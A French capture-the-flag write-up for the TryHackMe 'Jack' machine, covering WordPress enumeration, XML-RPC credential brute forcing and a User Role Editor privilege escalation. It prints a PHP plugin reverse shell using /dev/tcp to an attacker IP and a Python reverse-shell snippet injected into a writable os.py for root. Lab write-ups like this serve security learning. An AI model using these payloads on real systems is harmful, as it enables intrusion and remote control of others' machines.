# Jack | Hard

![Untitled](https://user-images.githubusercontent.com/68467919/209412366-2c4baaf0-bc39-4e16-851d-93925b4af3ca.png)

## Énumération

Comme demandé dans l’énoncé, nous ajoutons jack.thm à notre /etc/hosts

### Nmap | Scan

```bash
sudo nmap -sC -sV -O -oN enum/nmap -vv jack.thm

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e7978089331d0837fe2bcb614bf5d9b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgHGMuutSoQktLWJfDa8F4+zCvINuPv8+mL2sHPJmSfFDaQ3jlsxitYWH7FWdj3zPzXLW01aY+AySXW593T3XZpzCSAjm3ImnPtNTaQsbsdkgmhj8eZ3q9hPxU5UD5593K+/FDdIiN5xIBLegm6y0SAd3sRtpdrcpHpkqOIZvoCyJTV7ncbRY0gppvfTEObo2PiCtzh31gbaDPrJICPnDuuF5aWAUTeUMc0YcMYaB9cCvfVT6Y1Cdfh4IwMHslafXRhRt5tn5l47xR0xwd3cddUEez/CHxiNthNTgv+BSo+TPPciPAiCN3QGSqTcPQ74RvFiAznL2irkENq+Qws2A3
|   256 3a679faf7e66fae3f8c754496338a293 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzJknVQsubSrZMKNLlNAP1HXXuXzhtAf24ScY17eIS03NfxjFwiSESz8xKwVcmbODQGc+b9PvepngTTGlVrMf4=
|   256 8cef55b023732c14094522ac84cb40d2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/WxvJRsI0dvT84mxR/y3AH3C8KP/1Njv4wP6DylZeQ
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.3.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Wpscan

```bash
wpscan --url http://jack.thm/ --enumerate u1-10

[i] User(s) Identified:

[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Trois utilisateurs sont trouvés grâce à Wpscan. Nous pourrions essayer de bruteforce le mot de passe de ces différents utilisateurs car **XMLRPC** est activé. La méthode **_system.multicall()_** permet d’envoyer plusieurs appels dans **une seule requête HTTP**. Grâce à ce “wrapper”, nous pouvons effectuer un grand nombre de tentatives de connexion avec un impact minimal sur le réseau. Nous allons en profiter pour pouvoir tenter de trouver le mot de passe d’un des trois utilisateurs ci-dessus. 

![Untitled 1](https://user-images.githubusercontent.com/68467919/209412372-ea2a6400-aa13-4785-98be-ceee6d110895.png)

Nous pouvons désormais nous connecter sur le panel du Wordpress grâce aux identifiants que nous avons trouvé.

## Wordpress | Wendy

![Untitled 2](https://user-images.githubusercontent.com/68467919/209412381-8dcf81bc-7cd9-46d9-9d3a-4e761764ddb5.png)

### User Role Editor Security Bypass

En cherchant une vulnérabilité lié à la version du Wordpress, je suis tombé sur cette CVE : 

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/44595)

La vulnérabilité permet à tout utilisateur enregistré d'obtenir un accès administrateur. 

Au lieu de vérifier si l'utilisateur actuel a le droit de modifier les profiles (capacité WP "edit_users"), la fonction vulnérable vérifie si l'utilisateur courant a le droit de modifier l'utilisateur (fonction WP "edit_user") spécifié par l'identifiant fourni (variable "user_id"/paramètre HTTP POST).

Cette vulnérabilité permet à un utilisateur authentifié d'ajouter un éditeur de rôle à son profil, en les spécifiant via le paramètre "ure_other_roles" dans la requête HTTP POST au module "profile.php" (émise lorsque "Update Profile" est cliqué).

*Plus d’informations ici :* 

[Vulnerability in User Role Editor - Users Can Become Admins](https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/)

En utilisant donc BurpSuite, j’ai modifié ma requête pour pouvoir s’élever en privilège sur le Wordpress.

![Untitled 3](https://user-images.githubusercontent.com/68467919/209412398-42f3fcc3-4975-4fbb-8a49-cb5d1720299c.png)

![Untitled 4](https://user-images.githubusercontent.com/68467919/209412411-98be8088-4317-488e-9cbe-6099f4f36705.png)

Pour obtenir un reverse-shell sur la machine, nous devons upload un nouveau plugin sur le Wordpress.

J’utilise ce payload ci-dessous : 

```php
<?php

/**
* Plugin Name: Wordpress Reverse Shell
* Author: b0unce
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.15.200/1337 0>&1'");
?>
```

Ensuite je le compresse dans un zip pour pouvoir l’upload.

```bash
zip reverse-shell.zip reverse-shell.php
```

Et je l’upload par la suite dans *Plugins*.

![Untitled 5](https://user-images.githubusercontent.com/68467919/209412419-d2e4c965-e5cc-4ecb-bf32-4bd899fe23f1.png)

![Untitled 6](https://user-images.githubusercontent.com/68467919/209412424-83b67a8b-1490-4b12-8499-75dc609b61c0.png)

(au moment où j’upload le zip, le fichier existe déjà car je l’ai déjà fait)

Après ça, il faut activer le plugin en lançant d’abord notre listener et boom !!

![Untitled 7](https://user-images.githubusercontent.com/68467919/209412433-6dbb73cd-ac25-4da0-903a-edc63cd6ff41.png)

## Flag 1 | Jack

![Untitled 8](https://user-images.githubusercontent.com/68467919/209412440-a96faa2d-2c5c-4448-9dad-5c0ed6418102.png)

Dans le fichier reminder.txt nous pouvons comprendre qu’une backup de Jack a été hacké ! En fouillant un peu dans les fichiers du système, nous pouvons trouver le répertoire /var/backups/ qui contient un fichier id_rsa. Avec l’id_rsa trouvé, nous pouvons nous connecter en SSH à la session de Jack.

## **Root**

En regardant les différents cronjob avec pspy nous pouvons voir que le script [checker.py](http://checker.py) s’exécute toutes les minutes 

![Untitled 9](https://user-images.githubusercontent.com/68467919/209412444-1f093016-e238-48bb-abc1-b1116001b7dd.png)

Nous pouvons vérifier ça aussi dans l’output qu’il génère.

![Untitled 10](https://user-images.githubusercontent.com/68467919/209412446-2d9ccca7-eb62-43c1-a28b-8b0c34d502e8.png)

```python
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```

Nous pouvons voir que le script utilise le module OS et la fonction system qui fait un appel au binaire curl pour pouvoir récupérer l’header de la requête puis le stock dans output.log.

En regardant les droits du module OS qui est dans le répertoire /usr/lib/python2.7/os.py nous pouvons écrire dedans !

![Untitled 11](https://user-images.githubusercontent.com/68467919/209412452-88d8b413-1db8-4924-a320-a27be3507774.png)

Nous pouvons ajouter ce morceau de code à la fin de os.py

[https://blog.finxter.com/python-one-line-reverse-shell/](https://blog.finxter.com/python-one-line-reverse-shell/)

```python
import socket,subprocess,os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

![Untitled 12](https://user-images.githubusercontent.com/68467919/209412457-e2958b36-3121-4cad-b1d2-da1c5e974b75.png)

ROOTED!
